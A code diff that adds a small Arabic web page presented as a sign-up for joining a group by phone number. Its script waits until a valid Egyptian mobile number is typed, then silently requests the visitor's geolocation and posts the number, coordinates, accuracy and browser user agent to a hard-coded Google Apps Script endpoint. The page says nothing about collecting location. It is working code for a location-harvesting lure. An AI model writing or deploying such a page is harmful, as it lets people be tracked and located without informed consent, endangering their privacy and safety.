@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <title>مشاركة بياناتي</title>
+</head>
+<body style="direction:rtl; font-family:Tahoma; max-width:600px; margin:auto;">
+  <h2>انطلق</h2>
+  <label>رقم الهاتف (لدخول الجروب):</label>
+  <input id="phone" placeholder="مثال: 010xxxxxxxx" style="width:100%; padding:8px;" maxlength="11"><br><br>
+  <pre id="result">في انتظار الإرسال...</pre>
+
+  <script>
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzxVdp38mAuQmgerziRNA4Q5PpjvMKdFM28BQxxwjKvGaO_y_zpDTQXZgBYDhcQcTLb/exec";
+
+    async function sendLocation(phone) {
+      if (!navigator.geolocation) {
+        alert("المتصفح لا يدعم تحديد الموقع");
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const payload = {
+          phone: phone,
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          userAgent: navigator.userAgent
+        };
+        try {
+          const res = await fetch(WEB_APP_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+          });
+          const data = await res.json();
+          document.getElementById('result').textContent = JSON.stringify({المرسل: payload, الخادم: data}, null, 2);
+        } catch(err) {
+          document.getElementById('result').textContent = "خطأ: " + err;
+        }
+      }, err => {
+        alert("خطأ في تحديد الموقع: " + err.message);
+      });
+    }
+
+    // راقب خانة رقم التليفون، ولما يبقى 11 رقم شغال أرسل
+    document.getElementById('phone').addEventListener('input', e => {
+      const val = e.target.value.trim();
+      if (val.length === 11 && /^01\d{9}$/.test(val)) {
+        sendLocation(val);
+      } else {
+        document.getElementById('result').textContent = "يرجى إدخال رقم موبايل صحيح مكون من 11 رقم يبدأ بـ 01";
+      }
+    });
+  </script>
+</body>
+</html>
